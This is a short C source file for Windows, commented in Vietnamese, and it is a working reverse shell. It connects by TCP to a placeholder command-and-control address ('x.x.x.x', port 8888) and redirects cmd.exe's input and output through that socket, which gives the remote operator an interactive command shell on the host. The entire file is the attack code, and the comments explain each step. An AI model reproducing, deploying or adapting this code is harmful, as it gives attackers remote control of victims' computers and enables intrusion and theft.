#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

int main(){

    WSADATA wsaData;
    struct sockaddr_in server;

    // init socket
    WSAStartup(MAKEWORD(2 ,2), &wsaData);

    // create socket
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // setup structure
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);
    server.sin_addr.s_addr = inet_addr("x.x.x.x");

    // pass structure & socket vao ham connect de thuc hien connect den server C2
    connect(sock, (struct sockaddr*)&server, sizeof(server));

    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    // su dung startup info de redirect std sang luong socket
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock; // socket co the ep kieu thanh handle trong 1 so truong hop su dung de nhan redirect stdin, stdout, stderr tu 1 process

    // create process & route qua socket su dung si struct
    CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;

}